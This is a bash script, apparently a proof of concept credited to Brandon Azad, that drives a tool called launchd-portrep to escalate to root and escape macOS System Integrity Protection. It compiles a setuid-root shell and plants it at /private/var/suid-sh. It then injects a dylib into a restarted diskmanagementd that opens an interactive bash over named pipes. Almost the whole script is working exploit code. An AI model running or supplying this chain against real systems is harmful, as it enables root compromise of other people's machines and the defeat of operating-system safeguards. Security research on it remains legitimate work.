#! /bin/bash
#
# launchd-portrep-rootless.sh
# Brandon Azad
#
# An example using launchd-portrep to get a rootless shell. Requires developer tools.
#

cd "$( dirname "${BASH_SOURCE[0]}" )"

error() {
	echo "Error: $1"
	exit 1
}

make -s || error "Could not build launchd-portrep"

cat << EOF > suid-sh.c || error "Could not write suid-sh.c"
#include <unistd.h>

int main(int argc, char **argv) {
	seteuid(0);
	setuid(0);
	setgid(0);
	argv[0] = "/bin/bash";
	return execve(argv[0], argv, NULL);
}
EOF

clang suid-sh.c -o suid-sh || error "Failed to compile suid-sh.c to suid-sh"

rm suid-sh.c

TARGET_SHELL="/private/var/suid-sh"
SHELL_COMMAND="$(which cp) $(pwd)/suid-sh $TARGET_SHELL; $(which chmod) 4555 $TARGET_SHELL"

pgrep -q sysdiagnose && error "sysdiagnose is running!"

./launchd-portrep "$SHELL_COMMAND" || error "launchd-portrep failed"

rm suid-sh

[ -f "$TARGET_SHELL" ] || error "Exploit payload failed to create $TARGET_SHELL"

TARGET_PID=$("$TARGET_SHELL" -c "launchctl kickstart -k -p system/com.apple.diskmanagementd" | sed 's/[^0-9]//g')

"$TARGET_SHELL" -c "rm '$TARGET_SHELL'"

TMP_DIR="$(mktemp -d)"
STDIN_FIFO="$TMP_DIR/0"
STDOUT_FIFO="$TMP_DIR/1"

mkfifo "$STDIN_FIFO" "$STDOUT_FIFO" || error "Could not create named pipes"

cat << EOF > rootless-sh.c || error "Could not write rootless-sh.c"
#include <unistd.h>
#include <os/log.h>

__attribute__((constructor))
static void
initialize() {
	os_log(OS_LOG_DEFAULT, "[%d]: injection successful!\n", getpid());
	system("bash -i <'$STDIN_FIFO' >'$STDOUT_FIFO' 2>&1 &");
}
EOF

clang -dynamiclib rootless-sh.c -o rootless-sh.dylib || error "Failed to compile rootless-sh.c to rootless-sh.dylib"

rm rootless-sh.c

./launchd-portrep $TARGET_PID "$PWD"/rootless-sh.dylib || error "launchd-portrep failed"

rm rootless-sh.dylib

cat "$STDOUT_FIFO" & cat >"$STDIN_FIFO"

rm "$STDIN_FIFO" "$STDOUT_FIFO"
rm -r "$TMP_DIR"
